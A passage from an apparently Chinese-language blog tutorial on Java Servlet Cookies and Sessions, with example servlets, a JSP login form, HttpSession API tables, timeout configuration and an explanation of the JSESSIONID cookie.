可以发送给服务器，哪些不发。 </p><p>path 属性是通过请求的地址来进行有效的过滤。 </p><p>CookieA path &#x3D; &#x2F;工程路径 </p><p>CookieB path &#x3D; &#x2F;工程路径&#x2F;abc </p><p>请求地址如下： </p><p><a href="http://ip:port/工程路径/a.html">http://ip:port/工程路径/a.html</a> 【CookieA 发送 ，CookieB 不发送 】</p><p><a href="http://ip:port/工程路径/abc/a.html">http://ip:port/工程路径/abc/a.html</a> 【CookieA 发送 ，CookieB 发送】</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CookieServlet</span> <span class="keyword">extends</span> <span class="title class_">BaseServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">testPath</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">Cookie</span> <span class="variable">cookie</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cookie</span>(<span class="string">&quot;path1&quot;</span>, <span class="string">&quot;path1&quot;</span>);</span><br><span class="line">        <span class="comment">// getContextPath() ===&gt;&gt;&gt;&gt; 得到工程路径</span></span><br><span class="line">        cookie.setPath( req.getContextPath() + <span class="string">&quot;/abc&quot;</span> );<span class="comment">// ===&gt;&gt;&gt;&gt; /工程路径/abc</span></span><br><span class="line">        resp.addCookie(cookie);</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;创建了一个带有 Path 路径的 Cookie&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Cookie-练习—免输入用户名登录"><a href="#Cookie-练习—免输入用户名登录" class="headerlink" title="Cookie 练习—免输入用户名登录"></a>Cookie 练习—免输入用户名登录</h2><p><strong>login.jsp页面：</strong></p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=<span class="string">&quot;http://localhost:8080/cookie_session/loginServlet&quot;</span> method=<span class="string">&quot;get&quot;</span>&gt;</span><br><span class="line">    用户名：&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span> value=<span class="string">&quot;$&#123;cookie.username.value&#125;&quot;</span>&gt; &lt;br&gt;</span><br><span class="line">    密码：&lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span>&gt; &lt;br&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;登录&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p><strong>LoginServlet程序：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.Cookie;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LoginServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;nan&quot;</span>.equals(username) &amp;&amp; <span class="string">&quot;123456&quot;</span>.equals(password)) &#123;</span><br><span class="line">            <span class="comment">//登录 成功</span></span><br><span class="line">            <span class="type">Cookie</span> <span class="variable">cookie</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cookie</span>(<span class="string">&quot;username&quot;</span>, username);</span><br><span class="line">            cookie.setMaxAge(<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>);<span class="comment">//当前 Cookie 一周内有效</span></span><br><span class="line">            response.addCookie(cookie);</span><br><span class="line">            System.out.println(<span class="string">&quot;登录 成功&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// 登录 失败</span></span><br><span class="line">            System.out.println(<span class="string">&quot;登录 失败&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h1><h2 id="什么是Session"><a href="#什么是Session" class="headerlink" title="什么是Session"></a>什么是Session</h2><p>Session是另一种记录客户状态的机制，不同的是Cookie保存在客户端浏览器中，而Session保存在服务器上。客户端浏览器访问服务器的时候，服务器把客户端信息以某种形式记录在服务器上。这就是Session。客户端浏览器再次访问时只需要从该Session中查找该客户的状态就可以了。</p><p>如果说<strong>Cookie机制是通过检查客户身上的“通行证”来确定客户身份的话，那么Session机制就是通过检查服务器上的“客户明细表”来确认客户身份。Session相当于程序在服务器上建立的一份客户档案，客户来访的时候只需要查询客户档案表就可以了。</strong></p><blockquote><p>为了获得更高的存取速度，服务器一般把Session放在内存里。每个用户都会有一个独立的Session，<strong>彼此独立，互不可见</strong>。如果Session内容过于复杂，当大量客户访问服务器时可能会导致内存溢出。因此，Session里的信息应该尽量精简。</p></blockquote><h2 id="Session-常用方法"><a href="#Session-常用方法" class="headerlink" title="Session 常用方法"></a>Session 常用方法</h2><table><thead><tr><th>方 法 名</th><th>描  述</th></tr></thead><tbody><tr><td>void setAttribute(String attribute, Object value)</td><td>设置Session属性。value参数可以为任何Java Object。通常为Java Bean。value信息不宜过大</td></tr><tr><td>String getAttribute(String attribute)</td><td>返回Session属性值</td></tr><tr><td>Enumeration getAttributeNames()</td><td>返回Session中存在的属性名</td></tr><tr><td>void removeAttribute(String attribute)</td><td>移除Session属性</td></tr><tr><td>String getId()</td><td>返回Session的ID。该ID由服务器自动创建，不会重复</td></tr><tr><td>long getCreationTime()</td><td>返回Session的创建日期。返回类型为long，常被转化为Date类型，例如：Date createTime &#x3D; new Date(session.get CreationTime())</td></tr><tr><td>long getLastAccessedTime()</td><td>返回Session的最后活跃时间。返回类型为long</td></tr><tr><td>int getMaxInactiveInterval()</td><td>返回Session的超时时间。单位为秒。超过该时间没有访问，服务器认为该Session失效</td></tr><tr><td>void setMaxInactiveInterval(int second)</td><td>设置Session的超时时间。单位为秒</td></tr><tr><td>void putValue(String attribute, Object value)</td><td>不推荐的方法。已经被setAttribute(String attribute, Object Value)替代</td></tr><tr><td>Object getValue(String attribute)</td><td>不被推荐的方法。已经被getAttribute(String attr)替代</td></tr><tr><td>boolean isNew()</td><td>返回该Session是否是新创建的</td></tr><tr><td>void invalidate()</td><td>使该Session失效</td></tr></tbody></table><h2 id="测试页面和BaseServlet-1"><a href="#测试页面和BaseServlet-1" class="headerlink" title="测试页面和BaseServlet"></a>测试页面和BaseServlet</h2><p><strong>测试页面：</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;pragma&quot;</span> <span class="attr">content</span>=<span class="string">&quot;no-cache&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;cache-control&quot;</span> <span class="attr">content</span>=<span class="string">&quot;no-cache&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Expires&quot;</span> <span class="attr">content</span>=<span class="string">&quot;0&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Session<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">&quot;http://localhost:8080/cookie_session/&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-tag">ul</span> <span class="selector-tag">li</span> &#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">list-style</span>: none;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">&quot;target&quot;</span> <span class="attr">width</span>=<span class="string">&quot;500&quot;</span> <span class="attr">height</span>=<span class="string">&quot;500&quot;</span> <span class="attr">style</span>=<span class="string">&quot;float: left;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;float: left;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;sessionServlet?action=createOrGetSession&quot;</span> <span class="attr">target</span>=<span class="string">&quot;target&quot;</span>&gt;</span>Session的创建和获取（id号、是否为新创建）<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;sessionServlet?action=setAttribute&quot;</span> <span class="attr">target</span>=<span class="string">&quot;target&quot;</span>&gt;</span>Session域数据的存储<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;sessionServlet?action=getAttribute&quot;</span> <span class="attr">target</span>=<span class="string">&quot;target&quot;</span>&gt;</span>Session域数据的获取<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>Session的存活<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;sessionServlet?action=defaultLife&quot;</span> <span class="attr">target</span>=<span class="string">&quot;target&quot;</span>&gt;</span>Session的默认超时及配置<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;sessionServlet?action=life3&quot;</span> <span class="attr">target</span>=<span class="string">&quot;target&quot;</span>&gt;</span>Session3秒超时销毁<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;sessionServlet?action=deleteNow&quot;</span> <span class="attr">target</span>=<span class="string">&quot;target&quot;</span>&gt;</span>Session马上销毁<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span> <span class="attr">target</span>=<span class="string">&quot;target&quot;</span>&gt;</span>浏览器和Session绑定的原理<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>BaseServlet程序：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">BaseServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        doPost(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">// 解决post请求中文乱码问题</span></span><br><span class="line">        <span class="comment">// 一定要在获取请求参数之前调用才有效</span></span><br><span class="line">        req.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        <span class="comment">// 解决响应中文乱码问题</span></span><br><span class="line">        resp.setContentType(<span class="string">&quot;text/html; charset=UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">action</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;action&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获取action业务鉴别字符串，获取相应的业务 方法反射对象</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> <span class="built_in">this</span>.getClass().getDeclaredMethod(action, HttpServletRequest.class, HttpServletResponse.class);</span><br><span class="line">            <span class="comment">// System.out.println(method);</span></span><br><span class="line">            <span class="comment">// 调用目标业务方法</span></span><br><span class="line">            method.invoke(<span class="built_in">this</span>, req, resp);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="创建和获取Session"><a href="#创建和获取Session" class="headerlink" title="创建和获取Session"></a>创建和获取Session</h2><p><strong>Session在用户第一次访问服务器的时候自动创建</strong>。需要注意只有访问JSP、Servlet等程序时才会创建Session，只访问HTML、IMAGE等静态资源并不会创建Session。如果尚未生成Session，也可以使request.getSession(true)强制生成Session。</p><p>创建和获取 Session，它们的 API 是一样的，都是request.getSession() ；</p><p><strong>第一次调用是</strong>：创建 Session 会话 </p><p><strong>之后调用都是</strong>：获取前面创建好的 Session 会话对象。 </p><p>isNew(); 判断Session是不是刚创建出来的（新的） 【true 表示刚创建 ，false 表示获取之前创建 】</p><p>getId() ;得到 Session 的会话 id 值，每个会话都有一个 ID 值。而且这个 ID 是<strong>唯一</strong>的。 </p><p><strong>getSession() 和 getSession(boolen isNew)区别：</strong></p><blockquote><p>getSession();相当于getSession(true);</p><p>getSession(boolen isNew)</p><p>参数为true时，若存在会话，则返回该会话，否则新建一个会话；</p><p>参数为false时，如存在会话，则返回该会话，否则返回NULL；</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SessionServlet</span> <span class="keyword">extends</span> <span class="title class_">BaseServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">createOrGetSession</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">// 创建或获取Session会话对象</span></span><br><span class="line">        <span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span> req.getSession();</span><br><span class="line">        <span class="comment">// 判断当前Session会话是否是新创建出来的</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isNew</span> <span class="operator">=</span> session.isNew();</span><br><span class="line">        <span class="comment">// 获取Session会话的唯一标识 id</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">id</span> <span class="operator">=</span> session.getId();</span><br><span class="line"></span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;得到的Session，它的id是：&quot;</span> + id + <span class="string">&quot; &lt;br /&gt; &quot;</span>);</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;这个Session是否是新创建的：&quot;</span> + isNew + <span class="string">&quot; &lt;br /&gt; &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Session-域数据的存取"><a href="#Session-域数据的存取" class="headerlink" title="Session 域数据的存取"></a>Session 域数据的存取</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SessionServlet</span> <span class="keyword">extends</span> <span class="title class_">BaseServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">setAttribute</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        req.getSession().setAttribute(<span class="string">&quot;key1&quot;</span>, <span class="string">&quot;value1&quot;</span>);</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;已经往Session中保存了key1的数据&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">getAttribute</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">attribute</span> <span class="operator">=</span> req.getSession().getAttribute(<span class="string">&quot;key1&quot;</span>);</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;从Session中获取出key1的数据是：&quot;</span> + attribute);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Session-生命周期控制"><a href="#Session-生命周期控制" class="headerlink" title="Session 生命周期控制"></a>Session 生命周期控制</h2><ul><li><p>Session生成后，只要用户继续访问，服务器就会更新Session的最后访问时间，并维护该Session。用户每访问服务器一次，<strong>无论是否读写Session，服务器都认为该用户的Session“活跃（active）”了一次。</strong></p></li><li><p>public void setMaxInactiveInterval(int interval) </p><ul><li>设置 Session 的超时时间（<strong>以秒为单位</strong>），超过指定的时长，Session 就会被销毁。</li><li>值为正数的时候，设定 Session 的超时时长。 </li><li>负数表示永不超时（极少使用）。</li><li><strong>注意：setMaxInactiveInterval(3);3秒内session没有“活跃”一次才会销毁，否则会一直重新倒计时。</strong></li></ul></li><li><p>public int getMaxInactiveInterval()；获取 Session 的超时时间 </p></li><li><p>public void invalidate() ；让当前 Session 会话马上超时无效。</p></li></ul><p>Session <strong>默认的超时时间长为 30 分钟</strong>。 </p><blockquote><p>因为在 Tomcat 服务器的配置文件 web.xml中默认有以下的配置，它就表示配置了当前 Tomcat 服务器下所有 web 工程的所有 Session 超时配置默认时长为：30 分钟。 （<strong>以分钟为单位</strong>）</p><p><code>&lt;session-config&gt;</code><br>         <code>&lt;session-timeout&gt;30&lt;/session-timeout&gt;</code><br><code> &lt;/session-config&gt;</code></p></blockquote><p>如果说你希望你的 web 工程默认的 Session 的超时时长为其他时长。你可以在你自己的 web.xml 配置文件中做相同的配置。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--表示当前 web 工程创建出来的所有 Session 默认是10分钟的超时时长--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">session-config</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">session-timeout</span>&gt;</span>10<span class="tag">&lt;/<span class="name">session-timeout</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">session-config</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SessionServlet</span> <span class="keyword">extends</span> <span class="title class_">BaseServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">defaultLife</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">// 获取了Session的默认超时时长</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">maxInactiveInterval</span> <span class="operator">=</span> req.getSession().getMaxInactiveInterval();</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;Session的默认超时时长为：&quot;</span> + maxInactiveInterval + <span class="string">&quot; 秒 &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">life3</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">// 先获取Session对象</span></span><br><span class="line">        <span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span> req.getSession();</span><br><span class="line">        <span class="comment">// 设置当前Session3秒后超时</span></span><br><span class="line">        session.setMaxInactiveInterval(<span class="number">3</span>);</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;当前Session已经设置为3秒后超时&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">deleteNow</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">// 先获取Session对象</span></span><br><span class="line">        <span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span> req.getSession();</span><br><span class="line">        <span class="comment">// 让Session会话马上超时</span></span><br><span class="line">        session.invalidate();</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;Session已经设置为超时（无效）&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="浏览器和-Session-之间关联的技术内幕"><a href="#浏览器和-Session-之间关联的技术内幕" class="headerlink" title="浏览器和 Session 之间关联的技术内幕"></a>浏览器和 Session 之间关联的技术内幕</h2><p>Session 技术底层其实是 <strong>基于Cookie技术</strong> 来实现的。服务器向客户端浏览器发送一个名为JSESSIONID的Cookie，它的值为该Session的id。该Cookie的maxAge属性一般为–1，表示仅当前浏览器内有效，并且各浏览器窗口间不共享，关闭浏览器就会失效。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214941.png"></p><p>注意：新开的浏览器窗口会生成新的Session，但子窗口除外。子窗口会共用父窗口的Session。例如，在链接上右击，在弹出的快捷菜单中选择“在新窗口中打开”时，子窗口便可以访问父窗口的Session。</p><p>参考博客：<a href="https://blog.csdn.net/fangaoxin/article/details/6952954">https://blog.csdn.net/fangaoxin/article/details/6952954</a></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> JavaWeb </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cookie </tag>
            
            <tag> Session </tag>
            
